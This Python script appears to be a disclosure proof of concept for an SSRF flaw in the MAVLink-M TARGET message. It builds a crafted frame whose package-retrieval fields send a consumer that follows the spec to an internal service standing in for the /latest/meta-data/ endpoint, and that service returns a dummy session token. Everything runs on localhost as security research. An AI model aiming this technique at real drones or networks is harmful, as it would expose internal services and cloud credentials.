#!/usr/bin/env python3
"""End-to-end demonstration of MAVLINKM-01: a single MAVLink-M TARGET message
drives a spec-faithful consumer to make an outbound request to a host, port and
path the *message sender* chose — an SSRF reachable to any sender of a TARGET.

Bench-only, all on 127.0.0.1, no external network. Two local HTTP servers stand
in for resources the drone must not be able to reach on its own:
  - an "internal C2/GCS-LAN service" (a secret the operator's workstation can see)
  - a cloud-style link-local metadata endpoint path (/latest/meta-data/)

Flow:
  1. A malicious (but validly formed) TARGET is built with its package-retrieval
     fields pointing at the internal service: ip=127.0.0.1, port=<internal>,
     transport=HTTP, path=/latest/meta-data/secret.
  2. The frame is packed and handed to `consume_target()`, which implements the
     TARGET package-retrieval fields exactly as military.xml specifies, and
     fetches the package.
  3. The internal service records that it was reached, and the consumer prints the
     secret it exfiltrated — proof the sender steered the consumer's HTTP client.

Run:  python3 -I ssrf_e2e.py      (needs: pip install pymavlink; military_dialect.py is committed here)
"""
import http.server
import socket
import sys
import threading
import urllib.request

sys.path.insert(0, ".")
import military_dialect as mav  # generated from military.xml; see generate_dialect.sh

SECRET = "INTERNAL-ONLY: aws_session_token=EXFIL-OK-if-you-see-this"
hits = []


class InternalService(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        hits.append((self.client_address[0], self.path))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(SECRET.encode())

    def log_message(self, *a):
        pass


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def ipv4_to_u32(a, b, c, d):
    # military.xml: packed as (a<<24)|(b<<16)|(c<<8)|d
    return (a << 24) | (b << 16) | (c << 8) | d


# ---- the consumer, implementing military.xml TARGET exactly as specified -------
TRANSPORT = {1: "http", 2: "https"}  # MAVLINK_M_TARGET_PACKAGE_TRANSPORT


def consume_target(frame: bytes):
    """A spec-faithful target-package consumer. Nothing here is attacker code: it
    reads the TARGET fields and fetches 'an externally hosted target package' from
    the endpoint and path the message carries, per their descriptions."""
    msg = mav.MAVLink(None).decode(bytearray(frame))
    assert msg.get_type() == "TARGET"
    if msg.package_endpoint_port == 0:
        return None  # "0 if no package is associated"
    ip = msg.package_endpoint_ip_1  # "Primary IPv4 endpoint ... for retrieval"
    a, b, c, d = (ip >> 24) & 255, (ip >> 16) & 255, (ip >> 8) & 255, ip & 255
    scheme = TRANSPORT.get(msg.package_transport, "http")
    path = msg.package_path  # pymavlink decodes char[] to str
    if isinstance(path, bytes):
        path = path.decode("ascii", "replace")
    path = path.rstrip("\x00")
    url = f"{scheme}://{a}.{b}.{c}.{d}:{msg.package_endpoint_port}{path}"
    print(f"  consumer builds URL from TARGET fields: {url}")
    with urllib.request.urlopen(url, timeout=5) as r:  # the SSRF sink
        return r.read().decode()


def build_malicious_target(ip_u32, port, path):
    m = mav.MAVLink(None, srcSystem=42, srcComponent=1)  # a compromised peer/payload
    msg = mav.MAVLink_target_message(
        time_usec=1, target_time_usec=0, target_id=7, target_set_id=0,
        package_id_hash=0xDEADBEEF,  # sender-supplied "integrity" (uint32) — it binds nothing
        target_name=b"friendly-looking target", lat=0, lon=0, alt=0.0,
        vx=0, vy=0, vz=0, cov_pos_x=0, cov_pos_y=0, cov_pos_z=0,
        cov_vel_x=0, cov_vel_y=0, cov_vel_z=0, cep_desired=0, cep_max=0, flags=0,
        package_endpoint_ip_1=ip_u32, package_endpoint_ip_2=0, package_endpoint_ip_3=0,
        target_class=0, target_domain=0, target_entity_2525d=0, target_force=0,
        confidence=0, package_endpoint_port=port, sensor_type=0,
        package_transport=1,  # HTTP (cleartext) — a listed transport value
        package_path=path.encode(), prf_code=0, tle_category=0,
        dmpi_reference_kind=0, restricted_target_flags=0)
    return bytes(msg.pack(m))


def main():
    port = free_port()
    srv = http.server.HTTPServer(("127.0.0.1", port), InternalService)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"internal service (should be unreachable by the drone) on 127.0.0.1:{port}")

    frame = build_malicious_target(ipv4_to_u32(127, 0, 0, 1), port,
                                   "/latest/meta-data/secret")
    print(f"malicious TARGET frame: {len(frame)} bytes, from sysid 42")

    body = consume_target(frame)

    print()
    print("internal service was reached by the consumer:", hits)
    print("consumer exfiltrated:", repr(body))
    ok = bool(hits) and body == SECRET
    print("\nRESULT:", "SSRF CONFIRMED — the TARGET sender chose the consumer's outbound request"
          if ok else "not reproduced")
    srv.shutdown()
    sys.exit(0 if ok else 1)


if __name__ == "__main__":
    main()
